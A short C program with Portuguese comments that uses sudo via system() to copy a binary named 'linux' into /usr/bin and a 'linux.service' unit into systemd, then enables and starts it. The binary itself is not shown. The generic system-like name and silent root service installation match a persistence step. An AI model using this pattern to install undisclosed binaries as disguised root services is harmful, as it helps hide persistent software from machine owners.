#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // Copiar o arquivo "linux" para /usr/bin/
    if (access("/usr/bin/linux", F_OK) != 0) {
        system("sudo cp linux /usr/bin/");
    }

    // Copiar o arquivo "linux.service" para /etc/systemd/system/
    if (access("/etc/systemd/system/linux.service", F_OK) != 0) {
        system("sudo cp linux.service /etc/systemd/system/");
    }

    // Habilitar o serviço no systemd
    system("sudo systemctl enable linux.service");

    // Iniciar o serviço
    system("sudo systemctl start linux.service");

    return 0;
}
